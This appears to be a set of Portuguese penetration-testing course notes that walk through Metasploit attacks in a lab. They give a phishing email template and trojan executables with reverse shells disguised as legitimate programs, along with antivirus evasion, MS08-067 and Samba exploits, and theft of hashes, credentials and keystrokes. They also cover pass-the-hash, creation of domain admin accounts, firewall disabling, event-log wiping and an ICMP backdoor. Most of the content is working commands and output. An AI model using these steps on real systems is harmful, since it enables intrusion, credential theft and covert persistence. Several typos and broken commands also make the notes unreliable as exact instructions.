+set..> Enter body of message, type END (capitals) when finished: All
+Body: No estamos iniaugurando um novo projeto de acesso remoto e 
+Body: contamos com sua colaboração nos teste.
+Body: Seu acesso inicial deve ser seus usuário de rede e a senha: mudar123
+Body: Para acessar o site do novo projeto basta clicar no link: <a href="http://192.168.1.10/>http://www.trainece.com/new_project</a>
+Body: Obrigado,
+Body: Departamento de TI
+Body: END
+
+Bypass Antivirus Software
+-------------------------
+
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.1.10 LPORT=1234 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
+
+# cp radmin.exe /var/www/
+
+Baixe a aplicação na máquina vitima
+O Windos Defender removeu o executável informando que era uma aplicação maliciosa
+
+
+# msfconsole
+msf> use exploit/multi/handler
+msf> set payload windows/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.10
+msf> set LPORT 1234
+msf> exploit
+
+Vamos utilizar um Crypter para obfuscar nosso malware
+
+# wine ../hyperion.exe ../radmin.exe bypasshyperion.exe
+# python -m SimpleHTTPServer
+Serving HTTP on 0.0.0. port 8080
+
+baixe o bypasshyperion.exe na vitima
+
+Post Exploit
+============
+
+Exploit Development
+-------------------
+No Windows abra o WinSCP faça um acesso, clique em save, selecione save password, e clique em login
+
+Agora vamos explorar a vitima utilizando a vuln ms08_067_netapi
+# msfconsole
+msf> use exploit/windows/smb/ms08_067_netapi
+msf> set payload windows/meterpreter/reverse_tcp
+msf> set LHOST 192.168.1.10
+msf> set LPORT 1234
+msf> exploit
+meterpreter> search -f *password*
+meterpreter> search -f *credit*
+meterpreter> background
+[*] Background session 7
+
+*** Observação: de uma olhada nos modulos para capturar dados em # ls /usr/share/metasploit-framework/modules/post/windows/gather/credentials/
+
+msf> use post/windows/gather/credentials/winscp
+msf> show options
+SESSION 
+msf> set SESSION 7
+msf> exploit
+Host: 192.168.1.20 Port: 22 Protocol: SSH Username: well Password: P@ss0rd
+
+msf> session -i 7
+meterpreter> shell
+C:\> net user myself myself /add
+C:\> net localsroup Administrators myself /add
+c:\> exit
+meterpreter> background
+
+**** Observação em Local Security Settings  --> Local Policies --> Security Options --> Network access: Sharing and security model for local accountd --> Classic - local users authenticate as themselves
+
+msf> use windows/smb/psexec
+msf> show options
+msf> set LHOST 192.168.1.10
+msf> set SMBUSER myself
+msf> set SMBPass myself
+msf> exploit
+meterpreter> hushdump
+copie um hash de um usuário
+meterpreter> background
+
+msf> set SMBPAss hash_do_dump_copiado
+msf> set SMBUser username_do_hash_dump
+msf> exploit
+meterpreter> load incognito
+meterpreter> help
+meterpreter> list_tokens
+meterpreter> list_tokens -u
+**** Logue com outro usuário na máquina vítima
+meterpreter> list_tokens -u
+meterpreter> impersonate_token BOOKXP\\secret <-- utilização do token do usuário secret 
+meterpreter> getuid
+BOOKXP\secret
+meterpreter> load mimikatz
+meterpreter> kerberos
+meterpreter>  rev2self
+meterpreter> getuid
+meterpreter> kerberos
+
+Pivoting
+--------
+
+meterpreter> ifconfig
+10.0.0.20
+meterpreter> background
+Session 6
+msf> route add 10.0.0.0 255.255.255.0 6
+msf> route show
+
+msf> use scanner/portscan/tcp
+msf> set RHOSTS 10.0.0.20
+msf> exploit
+
+msf> use exploit/windows/smb/ms08_067_netapi
+msf> set RHOST 10.0.0.20
+msf> set payload windows/meterpreter/bind_tcp
+msf> exploit
+
+meterpreter> background
+msf> use auxiliary/server/socks4a
+msf> show options
+msf> set SRVPORT 1000 --+
+msf> exploit		|
+			|
+em outro terminal	|
+			|
+# vi /etc/proxychains	|
+socks4 127.0.0.1000 <---+
+
+:wq
+# proxychains nmap -Pn -sT -sV -p 445, 446 10.0.0.30
+
+Setting Up a Domain Controller
+------------------------------
+./smbexec.rb
+1
+7
+10.0.0.30
+user_h2s
+password_hash <LM>:<NTLM>: how2sec1
+domain: how2security
+process? [y|n]: y
+<ENTER>
+
+7
+<ENTER>
+<ENTER>
+<ENTER>
+<ENTER>
+y
+
+3
+2
+<ENTER>
+<ENTER>
+<ENTER>
+<ENTER>
+
+3
+5
+
+# cd log/smbexec-2015-1-12/hashes
+# cat all_hashes_by_host.txt
+
+msf> session -i 6
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> guetuid
+meterpreter> background
+msf> use exploit/windows/smb/psexec
+msf> set SMBUser administrator
+msf> set SMBPass BultPass123
+msf> set SMBDomain how2security
+msf> set LHOST 10.0.0.20
+msf> exploit
+
+meterpreter> load incognito
+meterpreter> list_tokens -u
+meterpreter> inpersonate_token Buldsec\\Administrator
+meterpreter> getuid
+Administrator
+meterpreter> shell
+C:\> net user w3ll P@ssw0rd /add /domain
+C:\> net groups "Domain Admins" w3ll /add /domain
+c>\> exit
+meterpreter>
+
+***** em outro terminal
+
+# ./smbexec.rb
+3
+1
+ip 10.0.0.30
+user: administrator
+pass: Bulbpass123
+dom: HOW2SECURITY
+<ENTER>
+<ENTER>
+<ENTER>
+<ENTER>
+
+WebApp
+======
+
+Vuln Web App
+------------
+
+
+
+
+
+
+Exploit Development
+===================
+
+A Program in Memory
+-------------------
+
+
+	Low Memory
++------------------------+
+|	Text		 |
++------------------------+
+|	Data		 |
++------------------------+
+|	Heap		 |
+|	  |		 |
+|         v		 |
+|			 |
++------------------------+
+|	  		 |
+|	  ^		 |
+|         |		 |
+|	Stack		 |
++------------------------+
+	High Memory
+
+x86 General Purpose Registers
+
+EIP -> The instructin point
+ESP -> Stack Point
+EBP -> Base Point
+ESI -> Source Index
+EDI -> Destination Inedx
+EAX -> Accoumulator
+EBX -> Base
+ECX -> Counter
+EDX -> Data
+
+Last in first out (thing a stack of lunch trays)
+Grow from high to low memory seems upside down)
+PUSH -> Instruction puts data on the stack
+POP -> Instruction removes data from the stack (into a register)
+
+	Low Memory
++------------------------+
+|	Text		 |
++------------------------+
+|	Data		 |
++------------------------+
+|	Heap		 |
+|	  |		 |
+|         v		 |
+|			 |
++------------------------+ <--- ESP
+|	  		 |
+|	  ^		 |
+|         |		 |
+|	Stack		 |
++------------------------+ <--- EBP
+	High Memory
+
+Calling Another Function
+
+- Main calls another function
+- When that fuction finishes execution will return to main
+- Before handing over control to fuction main PUSHes its return address onto the stack
+- As part of the next fuction's prologue
+
+	Low Memory
++------------------------+ <--- ESP
+|	  		 |
+|	  		 |
+|         		 |
+|	Function1()	 |
++------------------------+ <--- EBP
+|    Return Address	 |
++------------------------+
+|			 |
+|	  		 |
+|        Main()	 	 |
+|			 |
++------------------------+
+	High Memory
+
+# vi overflowtest.c
+
+#include <stdio.h>
+#include <string.h>
+
+void overflowed()
+{
+	printf("%s\n", "Execution Hijacked");
+}
+
+void function(char *str)
+{
+	char buffer[5];
+	strcpy(buffer, str);
+}
+
+void main(int argc, char *argv[])
+{
+	function(argv[1]);
+	printf("%s\n', "Execution normally");
+}
+
+# gcc -g -fno-stack-protector -o overflowtest overflowtest.c 
+
+# ./overflowtest AAAAA
+Execution Normally
+
+#./overflowtest AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+# gdb overflowtest
+(gdb) list 1, 19
+1	#include <stdio.h>
+2	#include <string.h>
+3 
+4	void overflowed()
+5	{
+6		printf("%s\n", "Execution Hijacked");
+7	}
+8 
+9	void function(char *str)
+10	{
+11		char buffer[5];
+12		strcpy(buffer, str);
+13	}
+14
+15	void main(int argc, char *argv[])
+16	{
+17		function(argv[1]);
+18		printf("%s\n', "Execution normally");
+19	}
+(gdb) break 17
+(gdb) break 12
+(gdb) break 13
+(gdb) run AAAA
+(gdb) x/16xw $esp
+(gdb)
+
+
+Metasploit - Fundamentals
+=========================
+
+# cd /usr/share/metasploit-framework/
+# ls
+# ls modules/exploits/windows/smb/
+
+Aqui estão os exploits do framework
+
+podemos ver outros exploits em sites que disponibilizam códigos para testes como o caso do https://www.exploit-db.com/
+Link exploits
+
+# service postgresql start
+# service metasploit start
+# msfconsole
+msf> help
+
+msf> help route
+
+msf>  search ms08-067
+
+msf> info exploit/windows/smb/ms08-067_netapi
+
+msf exploit(ms08_067_netapi) > nmap -sT -A --script-args=unsafe=1 --script=smb-check-vulns -P0 192.168.1.130
+[*] exec: nmap -sT -A --script-args=unsafe=1 --script=smb-check-vulns -P0 192.168.1.130
+
+Host script results:
+| smb-check-vulns: 
+|   MS08-067: VULNERABLE  <--- VULNERAVEL
+|   Conficker: Likely CLEAN
+|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
+|   MS06-025: NO SERVICE (the Ras RPC service is inactive)
+|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
+
+msf > 
+
+msf > use exploit/windows/smb/ms08_067_netapi 
+msf exploit(ms08_067_netapi) > show options
+
+
+msf exploit(ms08_067_netapi) > set RHOST 192.168.1.130
+RHOST => 192.168.1.130
+msf exploit(ms08_067_netapi) > 
+
+
+msf exploit(ms08_067_netapi) > show payloads
+
+
+msf exploit(ms08_067_netapi) > set payload windows/shell/bind_tcp
+payload => windows/shell/bind_tcp
+msf exploit(ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.1.130    yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/shell/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LPORT     4444             yes       The listen port
+   RHOST     192.168.1.130    no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(ms08_067_netapi) > 
+
+msf exploit(ms08_067_netapi) > set LPORT 1234
+LPORT => 1234
+
+
+msf exploit(ms08_067_netapi) > exploit 
+
+[*] Started bind handler
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] Attempting to trigger the vulnerability...
+[*] Encoded stage with x86/shikata_ga_nai
+[*] Sending encoded stage (267 bytes) to 192.168.1.130
+[*] Command shell session 1 opened (192.168.1.126:50018 -> 192.168.1.130:1234) at 2015-11-27 14:56:44 -0200
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>
+
+
+C:\WINDOWS\system32>^Z   <---------------------------------- CTRL+Z
+Background session 2? [y/N]  y
+msf exploit(ms08_067_netapi) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type           Information  Connection
+  --  ----           -----------  ----------
+  2   shell windows               192.168.1.126:37623 -> 192.168.1.130:1234 (192.168.1.130)
+
+msf exploit(ms08_067_netapi) > sessions -i 2
+[*] Starting interaction with 2...
+
+C:\WINDOWS\system32>^C
+Abort session 2? [y/N]  y
+
+[*] 192.168.1.130 - Command shell session 2 closed.  Reason: User exit
+msf exploit(ms08_067_netapi) > 
+
+msf > back
+msf > use exploit/windows/smb/ms08_067_netapi 
+msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > set RHOST 192.168.1.130
+RHOST => 192.168.1.130
+msf exploit(ms08_067_netapi) > set LHOST 192.168.1.126
+LHOST => 192.168.1.126
+msf exploit(ms08_067_netapi) > set LPORT 8080
+LPORT => 8080
+msf exploit(ms08_067_netapi) > exploit
+
+[*] Started reverse handler on 192.168.1.126:8080 
+[*] Automatically detecting the target...
+[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (885806 bytes) to 192.168.1.130
+[*] Meterpreter session 3 opened (192.168.1.126:8080 -> 192.168.1.130:1199) at 2015-11-27 16:32:30 -0200
+
+meterpreter > shell
+Process 2732 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>exit
+exit
+meterpreter > 
+
+meterpreter > run checkvm
+[*] Checking if target is a Virtual Machine .....
+[*] This is a VMware Virtual Machine
+meterpreter > run getcountermeasure
+[*] Running Getcountermeasure on the target...
+[*] Checking for contermeasures...
+[*] Getting Windows Built in Firewall configuration...
+[*] 	
+[*] 	Domain profile configuration (current):
+[*] 	-------------------------------------------------------------------
+[*] 	Operational mode                  = Disable
+[*] 	Exception mode                    = Enable
+[*] 	
+[*] 	Standard profile configuration:
+[*] 	-------------------------------------------------------------------
+[*] 	Operational mode                  = Enable
+[*] 	Exception mode                    = Enable
+[*] 	
+[*] 	Bluetooth Network Connection firewall configuration:
+[*] 	-------------------------------------------------------------------
+[*] 	Operational mode                  = Enable
+[*] 	
+[*] 	RI firewall configuration:
+[*] 	-------------------------------------------------------------------
+[*] 	Operational mode                  = Enable
+[*] 	
+[*] 	NAT firewall configuration:
+[*] 	-------------------------------------------------------------------
+[*] 	Operational mode                  = Enable
+[*] 	
+[*] Checking DEP Support Policy...
+meterpreter > 
+
+
+meterpreter > ps
+
+
+1804  3900  explorer.exe       x86   0        HOW2SECURITY\administrator    C:\WINDOWS\Explorer.EXE
+
+meterpreter > getpid
+Current pid: 1144
+meterpreter > migrate 1804
+[*] Migrating from 1144 to 1804...
+[*] Migration completed successfully.
+meterpreter > getpid
+Current pid: 1804
+meterpreter > 
+
+meterpreter > getuid
+Server username: FUSCA\user_h2s
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+meterpreter > run post/windows/capture/keylog_recorder 
+
+[*] Executing module against FUSCA
+[*] Starting the keystroke sniffer...
+[*] Keystrokes being saved in to /root/.msf4/loot/20151127164625_default_192.168.1.130_host.windows.key_270733.txt
+[*] Recording keystrokes...
+
+em outro terminal
+root@kali-well:~# tail -f /root/.msf4/loot/20151127164625_default_192.168.1.130_host.windows.key_270733.txt 
+Keystroke log started at 2015-11-27 16:46:24 -0200
+
+
+Volta ao terminal
+^C[*] Saving last few keystrokes...
+[*] Interrupt 
+[*] Stopping keystroke sniffer...
+meterpreter > 
+
+meterpreter > run hashdump 
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY f38684e7bd8e85e973a3b6dc3d193d37...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+
+Administrator:500:921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:d8f9dd207607bff376803a4c29d1ab2d:ced96e6475960d07288226da2c720b79:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:84602825ebbc4e4e4fcc06e8ec1c3e4f:::
+user_h2s:1003:921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42:::
+
+
+meterpreter > 
+meterpreter > clearev 
+[*] Wiping 389 records from Application...
+[*] Wiping 1296 records from System...
+[-] stdapi_sys_eventlog_open: Operation failed: 1314
+meterpreter > 
+
+PASS-The-HASH
+
+meterpreter > ifconfig 
+
+Interface  2
+============
+Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC : 00:0c:29:90:4a:35
+MTU          : 1500
+IPv4 Address : 172.30.0.5 <-- outra rede
+IPv4 Netmask : 255.255.255.0
+
+
+Interface 65541
+============
+Name         : VMware Accelerated AMD PCNet Adapter - Packet Scheduler Miniport
+Hardware MAC : 00:0c:29:90:4a:3f
+MTU          : 1500
+IPv4 Address : 192.168.1.130
+IPv4 Netmask : 255.255.255.0
+
+meterpreter > 
+
+meterpreter > run get_local_subnets
+Local subnet: 172.30.0.0/255.255.255.0
+Local subnet: 192.168.1.0/255.255.255.0
+meterpreter > background
+[*] Backgrounding session 5...
+msf exploit(ms08_067_netapi) > route add 172.30.0.0 255.255.0.0 5
+[*] Route added
+msf exploit(ms08_067_netapi) > route print
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.30.0.0         255.255.0.0        Session 5
+
+msf exploit(ms08_067_netapi) > 
+
+
+msf exploit(ms08_067_netapi) > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set LHOST 192.168.1.126
+LHOST => 192.168.1.126
+msf exploit(psexec) > set RHOST 172.30.0.30
+RHOST => 172.30.0.30
+msf exploit(psexec) > set SMBPass 921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42
+SMBPass => 921988ba001dc8e14a3b108f3fa6cb6d:e19ccf75ee54e06b06a5907af13cef42
+msf exploit(psexec) > set SMBUser Administrator
+SMBUser => Administrator
+msf exploit(psexec) > set LPORT 8081
+LPORT => 8081
+msf exploit(psexec) > exploit
+
+[*] Started reverse handler on 192.168.1.126:8081 
+[*] Connecting to the server...
+[*] Authenticating to 172.30.0.30:445|WORKGROUP as user 'Administrator'...
+[*] Uploading payload...
+[*] Created \OgXcUxuA.exe...
+[*] Sending stage (885806 bytes) to 192.168.1.51
+[+] 172.30.0.30:445 - Service started successfully...
+[*] Deleting \OgXcUxuA.exe...
+[*] Meterpreter session 6 opened (192.168.1.126:8081 -> 192.168.1.51:1934) at 2015-11-27 17:24:20 -0200
+[-] Exploit failed: Rex::StreamClosedError Stream #<TCPSocket:0x007ffb382e4380> is closed.
+
+meterpreter > shell
+Process 4080 created.
+Channel 1 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter LAN:
+
+   Connection-specific DNS Suffix  . : how2security.com.br
+   IP Address. . . . . . . . . . . . : 172.30.0.30
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter WAN:
+
+   Connection-specific DNS Suffix  . : 
+   IP Address. . . . . . . . . . . . : 192.168.1.51
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.1.1
+
+C:\WINDOWS\system32>
+
+VAMOS ABUSAR DO SISTEMA
+
+C:\WINDOWS\system32>dsquery user -name Administrator
+dsquery user -name Administrator
+"CN=Administrator,CN=Users,DC=how2security,DC=com,DC=br"
+
+C:\WINDOWS\system32>
+
+
+C:\WINDOWS\system32>dsadd user CN=Penetra,CN=Users,DC=how2security,DC=com,DC=br -pwd 12qw!@QW -pwdneverexpires yes -disabled no -memberof "CN=Administrators,CN=Builtin,DC=how2security,DC=com,DC=br" "CN=Schema Admins,CN=Users,DC=how2security,DC=com,DC=br" "CN=Enterprise Admins,CN=Users,DC=how2security,DC=com,DC=br"
+dsadd user CN=Penetra,CN=Users,DC=how2security,DC=com,DC=br -pwd 12qw!@QW -pwdneverexpires yes -disabled no -memberof "CN=Administrators,CN=Builtin,DC=how2security,DC=com,DC=br" "CN=Schema Admins,CN=Users,DC=how2security,DC=com,DC=br" "CN=Enterprise Admins,CN=Users,DC=how2security,DC=com,DC=br"
+dsadd succeeded:CN=Penetra,CN=Users,DC=how2security,DC=com,DC=br
+
+C:\WINDOWS\system32>netsh firewall set opmode disable
+netsh firewall set opmode disable
+Ok.
+
+
+C:\WINDOWS\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+The operation completed successfully.
+
+C:\WINDOWS\system32>
+
+OUTRO TERMINAL
+
+root@kali-well:~# rdesktop -5 -a 16 -f 192.168.1.51
+
+C:\WINDOWS\system32>exit    
+exit
+meterpreter > exit
+
+root@kali-well:~# msfvenom -h
+Error: MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] <var=val>
+
+    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
+        --payload-options            List the payload's standard options
+    -f, --format        <format>     Output format (use --help-formats for a list)
+
+root@kali-well:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.126 LPORT=1234 -f exe > freecell.exe
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+
+root@kali-well:~# 
+
+root@kali-well:~# cp freecell.exe /var/www/html
+root@kali-well:~# service apache2 start
+root@kali-well:~# 
+
+Baixe o arquivo no windows xp, mas não execute ainda
+
+msf > info exploit/multi/handler 
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Wildcard Target
+
+Payload information:
+  Space: 10000000
+  Avoid: 0 characters
+
+msf > use exploit/multi/handler 
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.168.1.126
+LHOST => 192.168.1.126
+msf exploit(handler) > set LPORT 1234
+LPORT => 1234
+msf exploit(handler) > exploit
+
+[*] Started reverse handler on 192.168.1.126:1234 
+[*] Starting the payload handler...
+
+
+
+Agora sim execute no windows xp
+
+e olhe o que aconteceu
+
+[*] Meterpreter session 1 opened (192.168.1.126:1234 -> 192.168.1.130:1078) at 2015-11-27 20:00:12 -0200
+
+meterpreter > 
+
+-=-=-=-=-=-=-=-=-=
+
+LINUX
+-----
+
+root@kali-well:/usr/share/metasploit-framework# msfconsole 
+
+msf > nmap -sT -A -P0 192.168.1.129
+[*] exec: nmap -sT -A -P0 192.168.1.129
+
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2) <----------------------------------- APACHE 2.2.8
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
+|_http-title: Metasploitable2 - Linux
+
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian) <---------------------------------------------------------------- SAMBA 3.0.20
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP
+|_  System time: 2015-11-27T18:49:49-05:00
+
+
+msf > search samba
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+  exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
+
+ 
+Vamos usar o usermap_script porque está “hankeada” como excelente (excellent).
+
+msf > use exploit/multi/samba/usermap_script 
+msf exploit(usermap_script) > info
+
+Description:
+  This module exploits a command execution vulerability in Samba
+     +----------+--------------------------------------------------------------- Todo que o médico me receitou ;)
+     v          v
+  versions 3.0.20 through 3.0.25rc3 when using the non-default 
+  "username map script" configuration option. By specifying a username 
+  containing shell meta characters, attackers can execute arbitrary 
+  commands. No authentication is needed to exploit this vulnerability 
+  since this option is used to map usernames prior to authentication!
+
+
+msf exploit(usermap_script) > 
+
+
+msf exploit(usermap_script) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  		   yes       The target address
+   RPORT  139              yes       The target port
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  		    yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(usermap_script) > set RHOST 192.168.1.129
+RHOST => 192.168.1.129
+msf exploit(usermap_script) > set LHOST 192.168.1.126
+LHOST => 192.168.1.126
+msf exploit(usermap_script) > exploit
+
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo njW0Ay2LoAisLuTu;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "njW0Ay2LoAisLuTu\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (192.168.1.126:4444 -> 192.168.1.129:49814) at 2015-11-27 22:22:34 -0200
+
+id
+uid=0(root) gid=0(root)
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:a3:93:b1  
+          inet addr:192.168.1.129  Bcast:192.168.1.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fea3:93b1/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:8485 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4585 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:1040241 (1015.8 KB)  TX bytes:692999 (676.7 KB)
+          Interrupt:19 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:4433 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4433 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:2183713 (2.0 MB)  TX bytes:2183713 (2.0 MB)
+
+^C
+Abort session 2? [y/N]  y
+
+[*] 192.168.1.129 - Command shell session 2 closed.  Reason: User exit
+msf exploit(usermap_script) > 
+
+-=-=-=-=-=-=-=-=-=-=
+
+LINUX PASSTHRU
+
+NETCAT
+-------
+http://www.packetwatch.net/netcatfix.php
+
+comente a linha 
+res_init();
+
+entre no Makefile e acrecente a linha 
+DFLAGS = -DGAPING_SECURITY_HOLE -DTELNET -DLINUX 
+
+compile da seguinte forma
+# make linux
+./nc -h
+-e <--- Aquie está ela
+
+
+ESCALAÇÂO DE PRIV
+-----------------
+http://www.securityfocus.com/bid/7112/info
+http://downloads.securityfocus.com/vulnerabilities/exploits/km3.c
+http://downloads.securityfocus.com/vulnerabilities/exploits/myptrace.c
+http://downloads.securityfocus.com/vulnerabilities/exploits/ptrace-kmod.c
+
+$ gcc ptrace-kmod.c -o ptrace-kmod
+$ ./ptrace-kmod
+#
+
+BACKDOOR
+--------
+
+# wget --no-check-certificate https://dl.packetstormsecurity.net/new-exploits/ping-back.c
+
+### Tem que apagar o cabeçalho e o rodapé
+
+# gcc ping-back.c -o ping-back
+# ./ping-back 1234 8080
+
+Em outra mpáquina
+
+Terminal 1
+# ping -s 1234 192.168.1.250
+
+Terminal 2
+root@kali-well:~# nc 192.168.1.250 8080
+id
+uid=0(root) gid=0(root) grupos=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+ifconfig
+sh: ifconfig: command not found
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/dev/null
+rpm:x:37:37::/var/lib/rpm:/bin/bash
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/false
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/bin/false
+ident:x:98:98:pident user:/:/sbin/nologin
+radvd:x:75:75:radvd user:/:/bin/false
+apache:x:48:48:Apache:/var/www:/bin/sh
+squid:x:23:23::/var/spool/squid:/dev/null
+named:x:25:25:Named:/var/named:/bin/false
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+linux:x:500:500::/home/linux:/bin/bash
+ls /var/www/html
+4linux.jpg
+index2.php
+index.php
+^C
+root@kali-well:~# 
+
+
+keyscan_start
+keyscan_dump
+keyscab_stop
+
+
